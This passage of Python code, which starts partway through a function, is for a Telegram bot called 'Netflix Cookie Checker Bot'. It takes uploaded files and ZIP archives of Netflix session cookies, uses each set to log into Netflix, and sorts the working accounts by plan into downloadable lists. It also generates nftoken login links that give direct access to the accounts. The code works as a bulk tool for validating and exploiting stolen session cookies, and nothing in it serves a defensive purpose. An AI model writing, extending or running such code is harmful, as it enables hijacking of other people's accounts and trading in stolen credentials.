    lines.append("PROFILES")
    lines.append("-" * 40)
    lines.append(f"Connected Profiles: {profiles_count}")
    lines.append(f"Profiles: {profiles_display}")
    
    if is_subscribed and nftoken_data and nftoken_data.get("token"):
        lines.append("")
        lines.append("NFTOKEN LOGIN LINKS")
        lines.append("-" * 40)
        for label, link in build_nftoken_links(nftoken_data["token"], "both"):
            lines.append(f"{label}:")
            lines.append("")
            lines.append(link)
            lines.append("")
        if nftoken_data.get("expires_at_utc"):
            lines.append(f"Valid Until: {nftoken_data['expires_at_utc']}")
    
    lines.append("")
    lines.append("=" * 65)
    lines.append("")
    
    return "\n".join(lines), plan_key


# ==================== PROGRESS BAR ====================

def format_progress_message(processed, total, valid_count, premium_count, free_count, invalid_count, speed, eta):
    percentage = (processed / total) * 100 if total > 0 else 0
    filled = int(20 * percentage / 100)
    empty = 20 - filled
    bar = "█" * filled + "░" * empty
    
    message = f"""📦 Processing Progress

Total Cookies: {total}
Mode: Fullinfo
Filter: Premium accounts only

📊 Current Status:
{percentage:.1f}% {bar}

📁 Processing: {processed}/{total}
✅ Valid: {valid_count}
💰 Premium: {premium_count}
🆓 Free: {free_count}
❌ Invalid: {invalid_count}

⚡ Speed: {speed:.1f} acc/s
⏱️ ETA: {eta:.1f}s remaining

⚠️ Use /cancel to stop this task"""
    return message


# ==================== TELEGRAM BOT HANDLERS ====================

async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    first_name = user.first_name if user.first_name else "User"
    
    await update.message.reply_text(f"""
   🎬 Netflix Cookie Checker Bot

       ⚡ Developer: Eyad 🚀


✨ Welcome {first_name}! ✨

📌 WHAT I DO:

   ✅ Verify Netflix cookies
   
   ✅ Extract premium account details

⚙️ HOW TO USE:
   1️⃣ Export cookies (.txt or .json)
   2️⃣ Send files directly (single or ZIP)
   3️⃣ Watch progress bar
   4️⃣ Receive files by Plan


🕹️ COMMANDS:

   /start  → Show menu
   /help   → Instructions
   /stats  → Statistics
   /tokenonly  → Token-only mode
   /fullinfo   → Full details mode
   /cancel     → Stop current task

🔽 THE MENU BUTTON BELOW FOR COMMANDS
""")

async def bot_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("""
📖 HELP & INSTRUCTIONS

STEP 1: Export Cookies
   - EditThisCookie
   - Cookie-Editor
   - Get cookies.txt
   - Export as JSON for best results

STEP 2: Send Files
   - Send single .txt or .json
   - OR send ZIP with multiple files

STEP 3: Get Results
   - PREMIUM_ACCOUNTS.txt (Premium plans)
   - STANDARD_ACCOUNTS.txt (Standard plans)
   - BASIC_ACCOUNTS.txt (Basic plans)
   - MOBILE_ACCOUNTS.txt (Mobile plans)
   - FREE_ACCOUNTS.txt (Free accounts)
   - PARTIAL_DATA.txt (Limited data)

🔽 USE THE MENU BUTTON FOR COMMANDS
""")

async def bot_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"""
📊 BOT STATISTICS

Total files processed: {stats['total']}
✅ Valid Premium accounts: {stats['valid']}
🆓 Free accounts: {stats['free']}
❌ Failed/Invalid: {stats['failed']}
🔄 Currently processing: {stats['processing']}

🤖 Bot is running normally
""")

async def bot_tokenonly(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['mode'] = 'tokenonly'
    await update.message.reply_text("🔑 Token Only Mode - ACTIVATED")

async def bot_fullinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['mode'] = 'fullinfo'
    await update.message.reply_text("📋 Full Info Mode - ACTIVATED")

async def bot_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in user_tasks and user_tasks[uid].get('active'):
        user_tasks[uid]['cancel'] = True
        await update.message.reply_text("⏹️ Cancellation requested - Task will stop after current file")
    else:
        await update.message.reply_text("ℹ️ No active task to cancel")


# ==================== PROCESS SINGLE BUNDLE ====================

async def process_single_bundle(update: Update, context: ContextTypes.DEFAULT_TYPE, bundle, cookie_filename, status_msg, index, total):
    global stats
    
    cookies = bundle.get("cookies", {})
    
    if not has_required_netflix_cookies(cookies):
        return None, None, "Missing NetflixId cookie"
    
    await status_msg.edit_text(f"🔄 [{index}/{total}] Connecting to Netflix...")
    
    session = requests.Session()
    session.cookies.update(cookies)
    response_text, status_code, info = get_account_page(session, 20)
    
    if status_code == 200 and info and any(info.get(f) for f in ["countryOfSignup", "membershipStatus", "localizedPlanName"]):
        is_sub = is_subscribed_account(info)
        config = load_config()
        nftoken = None
        if config.get("nftoken", "both") != "false" and is_sub:
            nftoken, _ = create_nftoken(cookies, 1)
        
        mode = context.user_data.get('mode', 'fullinfo')
        if mode == 'tokenonly':
            email = info.get("email", "Unknown")
            result = f"Account: {email}\n\nNFToken Login Links:\n---\nPC Login:\n\nhttps://netflix.com/?nftoken={nftoken['token']}"
            return result, None, "success" if is_sub else "free"
        else:
            result, plan_key = format_result_beautiful(info, is_sub, bundle.get("netscape_text", ""), cookie_filename, nftoken, config, response_text)
            return result, plan_key, "success" if is_sub else "free"
    else:
        partial_info = extract_info_fallback(response_text) if response_text else {}
        if partial_info and any(partial_info.get(f) for f in ["countryOfSignup", "membershipStatus", "localizedPlanName"]):
            is_sub = is_subscribed_account(partial_info)
            result = f"""⚠️ Partial Data - {cookie_filename}

Status: {'Active' if is_sub else 'Free/Inactive'}
Country: {partial_info.get('countryOfSignup', 'Unknown')}
Plan: {partial_info.get('localizedPlanName', 'Unknown')}
Membership: {partial_info.get('membershipStatus', 'Unknown')}

ℹ️ Limited data. For full details, export cookies as JSON format.
"""
            return result, None, "partial"
        else:
            return None, None, f"HTTP {status_code}"


# ==================== SEND RESULTS WITH SPLITTING (30 حساب لكل ملف) ====================

async def send_large_results(update, results_by_plan, max_per_file=30):
    """إرسال النتائج بعد تقسيمها إلى ملفات متعددة - كل 30 حساب في ملف"""
    for plan, results in results_by_plan.items():
        if not results or plan == "partial":
            continue
        
        total_accounts = len(results) // 2
        chunk_size = max_per_file * 2
        total_chunks = (len(results) + chunk_size - 1) // chunk_size
        
        for chunk_idx in range(total_chunks):
            start_idx = chunk_idx * chunk_size
            end_idx = min((chunk_idx + 1) * chunk_size, len(results))
            chunk_results = results[start_idx:end_idx]
            
            if not chunk_results:
                continue
            
            chunk_text = "".join(chunk_results)
            buf = BytesIO()
            buf.write(chunk_text.encode('utf-8'))
            buf.seek(0)
            
            accounts_in_chunk = len(chunk_results) // 2
            if total_chunks == 1:
                filename = f"{plan.upper()}_ACCOUNTS.txt"
                caption = f"📄 {total_accounts} {plan.upper()} Accounts Found"
            else:
                filename = f"{plan.upper()}_ACCOUNTS_part{chunk_idx+1}_of_{total_chunks}.txt"
                caption = f"📄 Part {chunk_idx+1}/{total_chunks} - {accounts_in_chunk} {plan.upper()} Accounts"
            
            try:
                await update.message.reply_document(document=buf, filename=filename, caption=caption)
                await asyncio.sleep(0.3)
            except Exception as e:
                print(f"Error sending {filename}: {e}")


# ==================== SINGLE FILE HANDLER ====================

async def handle_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats
    
    uid = update.effective_user.id
    user_tasks[uid] = {'active': True, 'cancel': False}
    doc = update.message.document
    fname = doc.file_name
    start_time = time.time()
    
    if doc.file_size > 10 * 1024 * 1024:
        await update.message.reply_text("❌ File too large! Max 10MB. Use ZIP for larger collections.")
        user_tasks[uid]['active'] = False
        return
    
    file = await doc.get_file()
    data = BytesIO()
    await file.download_to_memory(data)
    content = data.getvalue().decode('utf-8', errors='ignore')
    
    bundles = extract_netflix_cookie_bundles(content)
    
    if not bundles:
        await update.message.reply_text("❌ No valid cookies found in this file.")
        stats['failed'] += 1
        user_tasks[uid]['active'] = False
        return
    
    total_bundles = len(bundles)
    await update.message.reply_text(f"📦 Found {total_bundles} cookie(s) in this file. Starting check...")
    
    results_by_plan = {
        "premium": [], "standard": [], "basic": [], "mobile": [], "free": [], "partial": []
    }
    
    invalid_count = 0
    processed = 0
    
    status_msg = await update.message.reply_text(f"📥 Processing: {fname}\n\n{format_progress_message(0, total_bundles, 0, 0, 0, 0, 0, 0)}")
    
    last_update_time = time.time()
    update_interval = 1.0
    
    for idx, bundle in enumerate(bundles, 1):
        if user_tasks[uid].get('cancel', False):
            await status_msg.edit_text("⏹️ Task cancelled by user")
            break
        
        current_time = time.time()
        if current_time - last_update_time >= update_interval or processed == total_bundles:
            elapsed = time.time() - start_time
            premium_count = len(results_by_plan["premium"])
            speed = processed / elapsed if elapsed > 0 else 0
            remaining = total_bundles - processed
            eta = remaining / speed if speed > 0 else 0
            
            progress_msg = format_progress_message(
                processed, total_bundles,
                stats['valid'], premium_count, len(results_by_plan["free"]),
                invalid_count, speed, eta
            )
            await status_msg.edit_text(progress_msg)
            last_update_time = current_time
        
        result, plan_key, result_type = await process_single_bundle(update, context, bundle, fname, status_msg, idx, total_bundles)
        
        if result:
            if result_type == "success":
                if plan_key and plan_key in results_by_plan:
                    results_by_plan[plan_key].append(result)
                else:
                    results_by_plan["premium"].append(result)
                target_key = plan_key if (plan_key and plan_key in results_by_plan) else "premium"
                results_by_plan[target_key].append("")
                stats['valid'] += 1
            elif result_type == "free":
                results_by_plan["free"].append(result)
                results_by_plan["free"].append("")
                stats['free'] += 1
            elif result_type == "partial":
                results_by_plan["partial"].append(result)
                results_by_plan["partial"].append("")
        else:
            invalid_count += 1
            stats['failed'] += 1
        
        stats['total'] += 1
        processed += 1
    
    if not user_tasks[uid].get('cancel', False):
        elapsed = time.time() - start_time
        spd = total_bundles / elapsed if elapsed > 0 else 0
        
        final = f"""
✅ Processing Complete

Final Statistics:
----------------------------------------------------
Total Cookies: {total_bundles}

Premium Accounts: {len(results_by_plan['premium']) // 2}
Standard Accounts: {len(results_by_plan['standard']) // 2}
Basic Accounts: {len(results_by_plan['basic']) // 2}
Mobile Accounts: {len(results_by_plan['mobile']) // 2}
Free Accounts: {len(results_by_plan['free']) // 2}
Partial Data: {len(results_by_plan['partial']) // 2}
Invalid Accounts: {invalid_count}

Time Taken: {elapsed:.2f} seconds
Speed: {spd:.2f} accounts/second
----------------------------------------------------
"""
        await status_msg.delete()
        await update.message.reply_text(final)
        
        # إرسال الملفات بالتقسيم (كل 30 حساب في ملف)
        await send_large_results(update, results_by_plan, max_per_file=30)
        
        if results_by_plan["partial"]:
            all_partial = "".join(results_by_plan["partial"])
            buf = BytesIO()
            buf.write(all_partial.encode('utf-8'))
            buf.seek(0)
            await update.message.reply_document(document=buf, filename="PARTIAL_DATA.txt", caption=f"⚠️ {len(results_by_plan['partial']) // 2} Accounts with Limited Data")
    
    user_tasks[uid]['active'] = False


# ==================== ZIP FILE HANDLER ====================

async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats
    uid = update.effective_user.id
    user_tasks[uid] = {'active': True, 'cancel': False}
    doc = update.message.document
    fname = doc.file_name
    start = time.time()
    
    if doc.file_size > 100 * 1024 * 1024:
        await update.message.reply_text("❌ File too large! Max 100MB")
        user_tasks[uid]['active'] = False
        return
    
    msg = await update.message.reply_text(f"📦 Processing ZIP: {fname}\n\nPlease wait...")
    file = await doc.get_file()
    zip_data = BytesIO()
    await file.download_to_memory(zip_data)
    
    results_by_plan = {
        "premium": [], "standard": [], "basic": [], "mobile": [], "free": [], "partial": []
    }
    
    invalid_count = 0
    total_files = 0
    processed = 0
    
    try:
        with zipfile.ZipFile(zip_data, 'r') as zf:
            files = [f for f in zf.namelist() if f.endswith(('.txt', '.json'))]
            total_files = len(files)
            if not files:
                await msg.edit_text("❌ No cookie files found in ZIP")
                user_tasks[uid]['active'] = False
                return
            
            config = load_config()
            mode = context.user_data.get('mode', 'fullinfo')
            
            for cf in files:
                if user_tasks[uid].get('cancel', False):
                    await msg.edit_text("⏹️ Task cancelled by user")
                    break
                
                try:
                    content = zf.read(cf).decode('utf-8', errors='ignore')
                    bundles = extract_netflix_cookie_bundles(content)
                    
                    if not bundles:
                        invalid_count += 1
                        processed += 1
                        continue
                    
                    for bundle in bundles:
                        cookies = bundle.get("cookies", {})
                        if has_required_netflix_cookies(cookies):
                            sess = requests.Session()
                            sess.cookies.update(cookies)
                            response_text, status_code, info = get_account_page(sess, 20)
                            
                            if status_code == 200 and info and any(info.get(f) for f in ["countryOfSignup", "membershipStatus", "localizedPlanName"]):
                                is_sub = is_subscribed_account(info)
                                if is_sub:
                                    nftoken = None
                                    if config.get("nftoken", "both") != "false":
                                        nftoken, _ = create_nftoken(cookies, 1)
                                    if mode == 'tokenonly':
                                        email = info.get("email", "Unknown")
                                        res = f"Account: {email}\n\nNFToken Login Links:\n---\nPC Login:\n\nhttps://netflix.com/?nftoken={nftoken['token']}"
                                        plan_key = "unknown"
                                    else:
                                        res, plan_key = format_result_beautiful(info, is_sub, bundle.get("netscape_text", ""), cf, nftoken, config, response_text)
                                    
                                    target_key = plan_key if plan_key in results_by_plan else "premium"
                                    results_by_plan[target_key].append(res)
                                    results_by_plan[target_key].append("")
                                    stats['valid'] += 1
                                else:
                                    res, plan_key = format_result_beautiful(info, is_sub, bundle.get("netscape_text", ""), cf, None, config, response_text)
                                    results_by_plan["free"].append(res)
                                    results_by_plan["free"].append("")
                                    stats['free'] += 1
                            else:
                                partial_info = extract_info_fallback(response_text) if response_text else {}
                                if partial_info and any(partial_info.get(f) for f in ["countryOfSignup", "membershipStatus", "localizedPlanName"]):
                                    is_sub = is_subscribed_account(partial_info)
                                    partial_res = f"""⚠️ Partial Data - {cf}

Status: {'Active' if is_sub else 'Free/Inactive'}
Country: {partial_info.get('countryOfSignup', 'Unknown')}
Plan: {partial_info.get('localizedPlanName', 'Unknown')}
Membership: {partial_info.get('membershipStatus', 'Unknown')}

ℹ️ Limited data. For full details, export cookies as JSON format.
"""
                                    results_by_plan["partial"].append(partial_res)
                                    results_by_plan["partial"].append("")
                                    stats['valid'] += 1 if is_sub else 0
                                    stats['free'] += 1 if not is_sub else 0
                                else:
                                    invalid_count += 1
                                    stats['failed'] += 1
                        else:
                            invalid_count += 1
                            stats['failed'] += 1
                        
                        stats['total'] += 1
                    
                    processed += 1
                    
                    if processed % 5 == 0:
                        await msg.edit_text(f"📦 Processed {processed}/{total_files} files...")
                    
                except Exception as e:
                    invalid_count += 1
                    processed += 1
                    print(f"Error: {e}")
        
        if not user_tasks[uid].get('cancel', False):
            elapsed = time.time() - start
            spd = total_files / elapsed if elapsed > 0 else 0
            
            final = f"""
✅ Processing Complete

Final Statistics:
----------------------------------------------------
Total Files: {total_files}

Premium Accounts: {len(results_by_plan['premium']) // 2}
Standard Accounts: {len(results_by_plan['standard']) // 2}
Basic Accounts: {len(results_by_plan['basic']) // 2}
Mobile Accounts: {len(results_by_plan['mobile']) // 2}
Free Accounts: {len(results_by_plan['free']) // 2}
Partial Data: {len(results_by_plan['partial']) // 2}
Invalid Accounts: {invalid_count}

Time Taken: {elapsed:.2f} seconds
Speed: {spd:.2f} files/second
----------------------------------------------------
"""
            await msg.delete()
            await update.message.reply_text(final)
            
            # إرسال الملفات بالتقسيم (كل 30 حساب في ملف)
            await send_large_results(update, results_by_plan, max_per_file=30)
            
            if results_by_plan["partial"]:
                all_partial = "".join(results_by_plan["partial"])
                buf = BytesIO()
                buf.write(all_partial.encode('utf-8'))
                buf.seek(0)
                await update.message.reply_document(document=buf, filename="PARTIAL_DATA.txt", caption=f"⚠️ {len(results_by_plan['partial']) // 2} Accounts with Limited Data")
        else:
            await msg.edit_text("⏹️ Task was cancelled")
            
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)[:200]}")
    finally:
        user_tasks[uid]['active'] = False


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    fname = update.message.document.file_name.lower()
    if fname.endswith('.zip'):
        await handle_zip_file(update, context)
    elif fname.endswith('.txt') or fname.endswith('.json'):
        await handle_single_file(update, context)
    else:
        await update.message.reply_text("❌ Send .txt, .json, or .zip files")

async def set_commands(app):
    await app.bot.set_my_commands([
        BotCommand("start", "Show menu"),
        BotCommand("help", "Instructions"),
        BotCommand("stats", "Statistics"),
        BotCommand("tokenonly", "Token only mode"),
        BotCommand("fullinfo", "Full details mode"),
        BotCommand("cancel", "Stop task"),
    ])


# ==================== MAIN ====================

def main():
    create_base_folders()
    print("\n" + "="*50)
    print("Netflix Cookie Checker Bot")
    print("="*50)
    print("Bot is starting...")
    print("="*50)
    
    # زيادة المهلة بشكل كبير عشان الملفات الكبيرة تتبعت من غير مشاكل
    request = HTTPXRequest(
        connect_timeout=90.0,
        read_timeout=300.0,
        write_timeout=180.0,
        pool_timeout=90.0,
    )
    
    app = Application.builder().token(BOT_TOKEN).request(request).build()
    
    app.add_handler(CommandHandler("start", bot_start))
    app.add_handler(CommandHandler("help", bot_help))
    app.add_handler(CommandHandler("stats", bot_stats))
    app.add_handler(CommandHandler("tokenonly", bot_tokenonly))
    app.add_handler(CommandHandler("fullinfo", bot_fullinfo))
    app.add_handler(CommandHandler("cancel", bot_cancel))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    
    try:
        asyncio.get_event_loop().run_until_complete(set_commands(app))
    except:
        pass
    
    print("✅ Bot is ready! Send /start on Telegram")
    print("Press Ctrl+C to stop\n")
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBot stopped")
